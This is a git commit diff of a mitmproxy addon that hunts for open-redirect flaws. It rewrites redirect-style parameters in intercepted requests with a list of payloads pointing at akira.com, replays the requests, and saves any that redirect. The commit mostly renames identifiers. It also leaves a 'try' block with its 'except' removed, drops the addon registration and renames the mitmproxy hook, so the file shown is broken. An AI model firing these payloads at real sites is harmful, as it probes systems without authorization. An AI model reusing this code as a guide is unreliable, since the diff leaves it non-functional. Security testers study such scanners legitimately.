dc3f17ef0d88221c433b1fbe60382d29571c2499
Djallal Fekirine <45321671+djallalzoldik@users.noreply.github.com>
2024-01-12 19:33:07 +0100

    Update openredirect.py

--- openredirect.py
+++ openredirect.py
@@ -8,11 +8,11 @@ import json
 
 class OpenRedirect:
     def __init__(self):
-        self.flow_dir = "openredirect"
-        os.makedirs(self.flow_dir, exist_ok=True)
+        self.flow_dir_openred = "openredirect"
+        os.makedirs(self.flow_dir_openred, exist_ok=True)
 
         # Corrected the invalid escape sequences and changed some strings to raw strings
-        self.payload_template = [
+        self.payload_template_openred = [
     "//akira.com/%2f..",
     r"//{host}@akira.com/%2f..",
     "///akira.com/%2f..",
@@ -134,18 +134,18 @@ class OpenRedirect:
     r"http://{host}.akira.com"
 ]
 
-        self.altered_header = "x-altered"
-        self.watched_parameters = ["outurl", "redirectionURL", "refURL", "returnURL", "siteurl", "targetURL", "urlTo", "redirectLocation", "redirectPage", "redirectPath", "redirectUrlTo", "urlRedirect", "redirectTo", "linkTo", "urlOut", "outboundUrl", "navTo", "jumpTo", "clickTo", "linkURL", "directTo", "moveTo", "outgoing_url", "outbound_link", "location_to", "forward", "from_url", "go", "goto", "host", "html", "image_url", "img_url", "load_file", "load_url", "login?to", "login_url", "logout", "navigation", "next", "next_page", "out", "page", "page_url", "path", "port", "redir", "redirect", "redirect_to", "redirect_uri", "redirect_url", "reference", "return", "returnTo", "return_path", "return_to", "return_url", "rt", "rurl", "show", "site", "target", "to", "uri", "url", "val", "validate", "view", "window", "location", "link", "click", "move", "jump", "follow", "nav", "ref", "locationURL", "redirectURL", "redirect_to_url", "pageurl", "navigate", "returnUrl", "redirectlink", "redirection", "referral", "direct", "forwardto", "gotoURL", "outlink", "targ", "linkto", "sendto", "dest", "destURL", "destination", "finalURL", "newUrl", "goToUrl", "navToURL", "referralURL", "returnURI", "uri_redirect", "path_redirect", "url_redirect", "location_redirect", "returnPath", "returnToURL", "outgoingURL", "redirectURI", "redirect_path", "redirect_url_path", "targetPath", "clickTarget", "followURL", "linkOut", "location_href", "jumpURL", "returnLink", "refLink", "sendURL", "url_destination", "redirect_destination", "goto_url", "forward_url", "nav_to", "move_to_url", "url_location", "redirect_location", "target_url", "target_link", "return_url_path", "return_to_path", "outgoing_link", "link_destination", "click_destination", "redirector", "redirection_link", "uri_location", "url_path", "path_to", "path_redirector", "go_url", "forward_link", "location_path"]
+        self.altered_header_openred = "x-altered-openred"
+        self.watched_parameters_openred = ["outurl", "redirectionURL", "refURL", "returnURL", "siteurl", "targetURL", "urlTo", "redirectLocation", "redirectPage", "redirectPath", "redirectUrlTo", "urlRedirect", "redirectTo", "linkTo", "urlOut", "outboundUrl", "navTo", "jumpTo", "clickTo", "linkURL", "directTo", "moveTo", "outgoing_url", "outbound_link", "location_to", "forward", "from_url", "go", "goto", "host", "html", "image_url", "img_url", "load_file", "load_url", "login?to", "login_url", "logout", "navigation", "next", "next_page", "out", "page", "page_url", "path", "port", "redir", "redirect", "redirect_to", "redirect_uri", "redirect_url", "reference", "return", "returnTo", "return_path", "return_to", "return_url", "rt", "rurl", "show", "site", "target", "to", "uri", "url", "val", "validate", "view", "window", "location", "link", "click", "move", "jump", "follow", "nav", "ref", "locationURL", "redirectURL", "redirect_to_url", "pageurl", "navigate", "returnUrl", "redirectlink", "redirection", "referral", "direct", "forwardto", "gotoURL", "outlink", "targ", "linkto", "sendto", "dest", "destURL", "destination", "finalURL", "newUrl", "goToUrl", "navToURL", "referralURL", "returnURI", "uri_redirect", "path_redirect", "url_redirect", "location_redirect", "returnPath", "returnToURL", "outgoingURL", "redirectURI", "redirect_path", "redirect_url_path", "targetPath", "clickTarget", "followURL", "linkOut", "location_href", "jumpURL", "returnLink", "refLink", "sendURL", "url_destination", "redirect_destination", "goto_url", "forward_url", "nav_to", "move_to_url", "url_location", "redirect_location", "target_url", "target_link", "return_url_path", "return_to_path", "outgoing_link", "link_destination", "click_destination", "redirector", "redirection_link", "uri_location", "url_path", "path_to", "path_redirector", "go_url", "forward_link", "location_path"]
 
-    def response(self, flow: http.HTTPFlow) -> None:
-        if self.altered_header in flow.request.headers:
-            self.check_altered_reflection(flow)
+    def response_openred(self, flow: http.HTTPFlow) -> None:
+        if self.altered_header_openred in flow.request.headers:
+            self.check_altered_reflection_openred(flow)
             return
 
         if flow.request.method in ["GET", "POST"]:
-            self.process_parameters(flow)
+            self.process_parameters_openred(flow)
 
-    def process_parameters(self, flow):
+    def process_parameters_openred(self, flow):
         params = {}  
         if flow.request.method == "GET":
             params = flow.request.query
@@ -162,50 +162,50 @@ class OpenRedirect:
                     ctx.log.info("JSON decode error")
                     params = {}
 
-        for watched_param in self.watched_parameters:
+        for watched_param in self.watched_parameters_openred:
             if watched_param in params:
                 value = params[watched_param][0] if isinstance(params[watched_param], list) else params[watched_param]
-                self.alter_and_replay(flow, watched_param, value)
+                self.alter_and_replay_openred(flow, watched_param, value)
 
-    def alter_and_replay(self, original_flow, param, original_value):
+    def alter_and_replay_openred(self, original_flow, param, original_value):
         host = original_flow.request.host
-        for template in self.payload_template:
-            altered_value = template.format(host=host)  
-            altered_flow = self.alter_request(original_flow, param, altered_value)
-            if altered_flow:
-                ctx.master.commands.call("replay.client", [altered_flow])
+        for template in self.payload_template_openred:
+            altered_flow_openred = template.format(host=host)  
+            altered_flow_openred = self.alter_request_openred(original_flow, param, altered_flow_openred)
+            if altered_flow_openred:
+                ctx.master.commands.call("replay.client", [altered_flow_openred])
 
-    def alter_request(self, original_flow, param, altered_value):
+    def alter_request_openred(self, original_flow, param, altered_flow_openred):
         new_request = copy.deepcopy(original_flow.request)
         if original_flow.request.method == "GET":
-            new_request.query[param] = altered_value
+            new_request.query[param] = altered_flow_openred
         else:
             content_type = new_request.headers.get("Content-Type", "")
             if "application/x-www-form-urlencoded" in content_type:
                 params = urllib.parse.parse_qs(new_request.get_text())
-                params[param] = [altered_value]
+                params[param] = [altered_flow_openred]
                 new_request.text = urllib.parse.urlencode(params, doseq=True)
             elif "application/json" in content_type:
                 try:
                     body = json.loads(new_request.get_text())
                     if param in body and isinstance(body[param], str):
-                        body[param] = altered_value
+                        body[param] = altered_flow_openred
                         new_request.text = json.dumps(body)
                 except json.JSONDecodeError:
                     pass
-        new_request.headers[self.altered_header] = "true"
-        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
-        altered_flow.request = new_request
-        return altered_flow
+        new_request.headers[self.altered_header_openred] = "true"
+        altered_flow_openred = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
+        altered_flow_openred.request = new_request
+        return altered_flow_openred
         
       
 
-    def check_altered_reflection(self, flow):
+    def check_altered_reflection_openred(self, flow):
         # Corrected the indentation and the regex pattern
         pattern = r'^https?:\/\/(www\.)?akira\.com'
         location = flow.response.headers.get("Location", "")
         if re.search(pattern, location):
-            self.save_flow(flow)
+            self.save_flow_openred(flow)
             return
 
         response_text = flow.response.get_text()
@@ -223,19 +223,14 @@ class OpenRedirect:
         ]
         for pattern in redirect_patterns:
             if re.search(pattern, response_text, re.IGNORECASE):
-                self.save_flow(flow)
+                self.save_flow_openred(flow)
                 break
 
-    def save_flow(self, flow):
+    def save_flow_openred(self, flow):
         
-        filename = os.path.join(self.flow_dir, f"captured_request_{int(time.time())}.mitm")
+        filename = os.path.join(self.flow_dir_openred, f"openredirect_request_{int(time.time())}.mitm")
         try:
             with open(filename, "wb") as file:
                 fw = FlowWriter(file)
                 fw.add(flow)
-            ctx.log.info(f"Saved altered flow to {filename}")
-        except OSError as e:
-            ctx.log.error(f"Error saving .mitm file: {e}")
-
-addons = [OpenRedirect()]
-
+            ctx.log.info(f"Saved openred flow to {filename}")
